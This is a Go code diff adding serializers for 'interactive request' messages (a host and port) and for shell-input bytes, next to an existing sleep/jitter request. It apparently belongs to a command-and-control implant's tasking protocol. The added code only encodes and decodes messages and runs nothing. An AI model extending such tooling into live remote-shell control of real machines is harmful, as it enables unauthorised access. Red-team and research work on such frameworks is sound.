@@ -137,3 +137,47 @@ func EncodeSetSleepReq(interval, jitter uint32) []byte {
 	binary.LittleEndian.PutUint32(b[4:], jitter)
 	return b
 }
+
+// EncodeInteractiveReq serializes an INTERACTIVE-REQ payload:
+// uint32 LE host_len + host bytes + uint16 LE port.
+func EncodeInteractiveReq(host string, port uint16) []byte {
+	b := make([]byte, 4+len(host)+2)
+	binary.LittleEndian.PutUint32(b[:4], uint32(len(host)))
+	copy(b[4:], host)
+	binary.LittleEndian.PutUint16(b[4+len(host):], port)
+	return b
+}
+
+// DecodeInteractiveReq deserializes an INTERACTIVE-REQ payload.
+func DecodeInteractiveReq(b []byte) (string, uint16, error) {
+	if len(b) < 6 {
+		return "", 0, fmt.Errorf("DecodeInteractiveReq: need at least 6 bytes, got %d", len(b))
+	}
+	hostLen := binary.LittleEndian.Uint32(b[:4])
+	if uint32(len(b)) < 4+hostLen+2 {
+		return "", 0, fmt.Errorf("DecodeInteractiveReq: truncated: need %d bytes, have %d", 4+hostLen+2, len(b))
+	}
+	host := string(b[4 : 4+hostLen])
+	port := binary.LittleEndian.Uint16(b[4+hostLen:])
+	return host, port, nil
+}
+
+// EncodeShellInput serializes shell stdin bytes: uint32 LE length + raw bytes.
+func EncodeShellInput(input []byte) []byte {
+	b := make([]byte, 4+len(input))
+	binary.LittleEndian.PutUint32(b[:4], uint32(len(input)))
+	copy(b[4:], input)
+	return b
+}
+
+// DecodeShellInput deserializes shell stdin bytes.
+func DecodeShellInput(b []byte) ([]byte, error) {
+	if len(b) < 4 {
+		return nil, fmt.Errorf("DecodeShellInput: need at least 4 bytes, got %d", len(b))
+	}
+	n := binary.LittleEndian.Uint32(b[:4])
+	if uint32(len(b)) < 4+n {
+		return nil, fmt.Errorf("DecodeShellInput: truncated: need %d bytes, have %d", 4+n, len(b))
+	}
+	return b[4 : 4+n], nil
+}
